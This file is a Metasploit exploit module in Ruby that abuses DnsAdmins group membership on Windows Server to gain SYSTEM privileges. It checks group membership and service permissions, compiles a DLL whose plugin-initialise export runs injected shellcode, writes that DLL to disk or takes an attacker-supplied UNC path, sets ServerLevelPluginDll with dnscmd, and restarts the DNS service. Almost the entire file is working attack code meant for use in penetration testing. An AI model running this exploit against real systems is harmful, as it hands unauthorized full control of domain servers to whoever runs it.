##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DnsAdmin ServerLevelPluginDll Feature Abuse Privilege Escalation',
      'Description'    => %q(
        This module exploits a feature in the DNS service of Windows Server. Users of the DnsAdmins group can set the
        `ServerLevelPluginDll` value using dnscmd.exe to create a registry key at `HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\`
        named `ServerLevelPluginDll` that can be made to point to an arbitrary DLL. After doing so, restarting the service
        will load the DLL and cause it to execute, providing us with SYSTEM privileges.
      ),
      'References'     =>
        [
          ['URL', 'https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83'],
          ['URL', 'https://adsecurity.org/?p=4064'],
          ['URL', 'http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html']
        ],
      'DisclosureDate' => "May 08 2017",
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Shay Ber', # vulnerability discovery
          'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module
        ],
      'Platform'       => 'win',
      'Targets'        => [[ 'Automatic', {} ]],
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' => { 'WfsDelay' => 10 })
    )

    register_options(
      [
        OptString.new('DLLNAME', [ false, 'DLL name (default: msf.dll)', "msf.dll"]),
        OptString.new('DLLPATH', [ false, 'Path to DLL. Can be a UNC path. (default: %TEMP%)', "%TEMP%"])
      ]
    )

    deregister_options('FILE_CONTENTS')
  end

  def check
    username = client.sys.config.getuid
    user_sid = client.sys.config.getsid
    hostname = sysinfo['Computer']
    vprint_status("Running check against #{hostname} as user #{username}...")

    srv_info = service_info("DNS")
    if srv_info.nil?
      vprint_error("Unable to enumerate the DNS service!")
      return Exploit::CheckCode::Unknown
    end

    if srv_info && srv_info[:display].empty?
      vprint_error("The DNS service does not exist on this host!")
      return Exploit::CheckCode::Safe
    end

    # for use during permission check
    if srv_info[:dacl].nil?
      vprint_error("Unable to determine permissions on the DNS service!")
      return Exploit::CheckCode::Unknown
    end
    dacl_items = srv_info[:dacl].split("D:")[1].scan(/\((.+?)\)/)

    vprint_good("DNS service found on #{hostname}.")

    # user must be a member of the DnsAdmins group to be able to change ServerLevelPluginDll
    group_membership = get_whoami
    unless group_membership
      vprint_error("Unable to enumerate group membership!")
      return Exploit::CheckCode::Unknown
    end

    unless group_membership.include? "DnsAdmins"
      vprint_error("User #{username} is not part of the DnsAdmins group!")
      return Exploit::CheckCode::Safe
    end

    # find the DnsAdmins group SID
    dnsadmin_sid = ""
    group_membership.each_line do |line|
      unless line.include? "DnsAdmins"
        next
      end

      vprint_good("User #{username} is part of the DnsAdmins group.")
      line.split.each do |item|
        unless item.include? "S-"
          next
        end

        vprint_status("DnsAdmins SID is #{item}")
        dnsadmin_sid = item
        break
      end
      break
    end

    # check if the user or DnsAdmins group has the proper permissions to start/stop the DNS service
    if dacl_items.any? { |dacl_item| dacl_item[0].include? dnsadmin_sid }
      dnsadmin_dacl = dacl_items.select { |dacl_item| dacl_item[0].include? dnsadmin_sid }[0]
      if dnsadmin_dacl.include? "RPWP"
        vprint_good("Members of the DnsAdmins group can start/stop the DNS service.")
      end
    elsif dacl_items.any? { |dacl_item| dacl_item[0].include? user_sid }
      user_dacl = dacl_items.select { |dacl_item| dacl_item[0].include? user_sid }[0]
      if user_dacl.include? "RPWP"
        vprint_good("User #{username} can start/stop the DNS service.")
      end
    else
      vprint_error("User #{username} does not have permissions to start/stop the DNS service!")
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Vulnerable
  end

  def exploit
    if is_system?
      fail_with(Failure::BadConfig, "Session is already elevated!")
    end

    arch = sysinfo['Architecture']
    if arch != payload_instance.arch.first
      fail_with(Failure::BadConfig, "Wrong payload architecture!")
    end

    unless [CheckCode::Vulnerable].include? check
      fail_with(Failure::NotVulnerable, "Target is most likely not vulnerable!")
    end

    # if the DNS service is not started, it will throw RPC_S_SERVER_UNAVAILABLE when trying to set ServerLevelPluginDll
    print_status("Checking service state...")
    svc_state = service_status("DNS")
    if svc_state[:state] == 4
      print_status("DNS service is running, proceeding...")
    else
      print_status("DNS service is stopped, starting it...")
      service_start("DNS")
    end

    # the if block assumes several things:
    # 1. operator has set up their own SMB share (SMB2 is default for most targets), as MSF does not support SMB2 yet
    # 2. operator has generated their own DLL with the correct payload and architecture
    # 3. operator's SMB share is accessible from the target. "Enable insecure guest logons" is "Enabled" on the target or
    #    the target falls back to SMB1
    dllpath = expand_path("#{datastore['DLLPATH']}\\#{datastore['DLLNAME']}").strip
    if datastore['DLLPATH'].start_with?("\\\\")
      # check if "Enable insecure guest logons" is enabled on the target system
      allow_insecure_guest_auth = registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters", "AllowInsecureGuestAuth")
      if allow_insecure_guest_auth == 1
        fail_with(Failure::BadConfig, "'Enable insecure guest logons' is not set to Enabled on the target system!")
      end

      print_status("Using user-provided UNC path.")
    else
      payload = generate_payload
      c_template = %Q|
        #include <Windows.h>
        #include <stdlib.h>
        #include <String.h>

        BOOL APIENTRY DllMain __attribute__((export))(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
          switch (dwReason) {
            case DLL_PROCESS_ATTACH:
            case DLL_THREAD_ATTACH:
            case DLL_THREAD_DETACH:
            case DLL_PROCESS_DETACH:
              break;
          }
          return TRUE;
        }

        int DnsPluginCleanup __attribute__((export))(void) { return 0; }
        int DnsPluginQuery __attribute__((export))(PVOID a1, PVOID a2, PVOID a3, PVOID a4) { return 0; }
        int DnsPluginInitialize __attribute__((export))(PVOID a1, PVOID a2) {
          char shellcode[] = "\xaa\xbb\xcc\xdd";
          void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          memcpy(exec, shellcode, sizeof shellcode);
          ((void(*)())exec)();
          return 0;
        }
      |

      c_template.gsub!("\xaa\xbb\xcc\xdd", Rex::Text.to_hex(payload.raw).to_s)

      cpu = nil
      if arch == "x86"
        cpu = Metasm::Ia32.new
      elsif arch == "x64"
        cpu = Metasm::X86_64.new
      end

      print_status("Building DLL...")
      require 'metasploit/framework/compiler/windows'
      dll = Metasploit::Framework::Compiler::Windows.compile_c(c_template, :dll, cpu)

      print_status("Writing DLL to #{dllpath}...")
      write_file(dllpath, dll)
    end

    print_status("Modifying ServerLevelPluginDll to point to #{dllpath}...")
    dnscmd_result = cmd_exec("cmd.exe /c dnscmd \\\\#{sysinfo['Computer']} /config /serverlevelplugindll #{dllpath}").to_s.strip
    unless dnscmd_result.include? "success"
      fail_with(Failure::UnexpectedReply, dnscmd_result.split("\n")[0])
    end

    print_good(dnscmd_result.split("\n")[0])
    print_status("Restarting the DNS service...")
    service_stop("DNS")
    service_start("DNS")
  end
end
